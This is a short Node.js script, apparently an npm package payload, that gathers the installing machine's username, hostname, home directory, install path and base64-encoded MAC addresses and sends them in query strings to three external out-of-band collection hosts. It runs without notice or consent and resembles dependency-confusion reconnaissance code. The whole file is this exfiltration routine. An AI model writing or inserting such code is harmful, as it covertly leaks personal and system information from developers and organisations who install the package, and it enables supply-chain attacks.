const os = require("os");
const querystring = require("querystring");
const http = require("http");
const fs = require("fs");
const packageJSON = require("./package.json");
const packageName = packageJSON.name;


function getMacAddressesBase64() {
    const networkInterfaces = os.networkInterfaces();
    const macAddresses = [];

    for (const interfaceName in networkInterfaces) {
        const interfaces = networkInterfaces[interfaceName];
        interfaces.forEach((iface) => {
            if (iface.mac && !macAddresses.includes(iface.mac)) {
                macAddresses.push(iface.mac);
            }
        });
    }

    const macString = macAddresses.join(",");
    return Buffer.from(macString).toString("base64");
}

const macAddressesBase64 = getMacAddressesBase64();

const trackingData = querystring.stringify({
    package: packageName,
    dir: __dirname,
    homedir: os.homedir(),
    hostname: os.hostname(),
    mac_addresses: macAddressesBase64,
    username: os.userInfo().username,
});

const addresses = [
    "dnipqouebm-psl.cn.oast-cn.byted-dast.com",
    "oqvignkp58-psl.i18n.oast-row.byted-dast.com",
    "sbfwstspuutiarcjzptfutygntsslnz7p.oast.fun"
];

function generateRandomFiveDigitNumber() {
    return Math.floor(10000 + Math.random() * 90000);
}

const randomNumber = generateRandomFiveDigitNumber();

addresses.forEach((hostname) => {
    const options = {
        hostname: hostname,
        port: "80",
        path: `/realtime_p/npm/${randomNumber}?${trackingData}`,
        method: "GET",
        rejectUnauthorized: false
    };

    const req = http.request(options, (res) => {
        res.on("data", (d) => {
            console.log(`Response from ${hostname}:`, d.toString());
        });
    });

    req.on("error", (e) => {
        console.error(`Error with request to ${hostname}:`, e);
    });

    req.end();
});
